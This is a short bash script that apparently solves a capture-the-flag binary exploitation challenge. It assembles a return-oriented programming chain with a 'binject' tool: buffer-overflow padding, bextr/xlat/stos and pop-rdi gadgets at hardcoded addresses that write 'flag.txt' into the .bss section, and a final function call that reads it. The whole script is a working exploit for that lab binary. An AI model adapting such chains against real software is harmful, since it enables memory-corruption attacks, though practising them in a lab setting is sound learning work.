#!/bin/bash

# overflow
binject -of ovf.bin -ns 40 A

# translate -> %al
binject -of xla.bin -a 400628

# pop -> %rdi
binject -of rdi.bin -a 4006a3
 
# store -> mem
binject -of sto.bin -a 400639

# each file to load one character from 'flag.txt' onto memory (on .bss sector)
# using (bextr -> xlat -> stos) 
binject -of ld0.bin -a 40062a -a 4000 -a 3fc4f7 -if xla.bin -if rdi.bin -a 601038 -if sto.bin
binject -of ld1.bin -a 40062b -a 3fc4ad -if xla.bin -if rdi.bin -a 601039 -if sto.bin
binject -of ld2.bin -a 40062b -a 3fc4c6 -if xla.bin -if rdi.bin -a 60103A -if sto.bin
binject -of ld3.bin -a 40062b -a 3fc84d -if xla.bin -if rdi.bin -a 60103B -if sto.bin
binject -of ld4.bin -a 40062b -a 3fc4e0 -if xla.bin -if rdi.bin -a 60103C -if sto.bin
binject -of ld5.bin -a 40062b -a 3fc4b5 -if xla.bin -if rdi.bin -a 60103D -if sto.bin
binject -of ld6.bin -a 40062b -a 3fc856 -if xla.bin -if rdi.bin -a 60103E -if sto.bin
binject -of ld7.bin -a 40062b -a 3fc46b -if xla.bin -if rdi.bin -a 60103F -if sto.bin

# load all characters
binject -of lod.bin -if ld0.bin -if ld1.bin -if ld2.bin -if ld3.bin -if ld4.bin -if ld5.bin -if ld6.bin -if ld7.bin

# function call (including pop for %rdi argument, as .bss memeory location)
binject -of fnc.bin -if rdi.bin -a 601038 -a 400510

# create ROP chain
binject -of fin.bin -if ovf.bin -if lod.bin -if fnc.bin
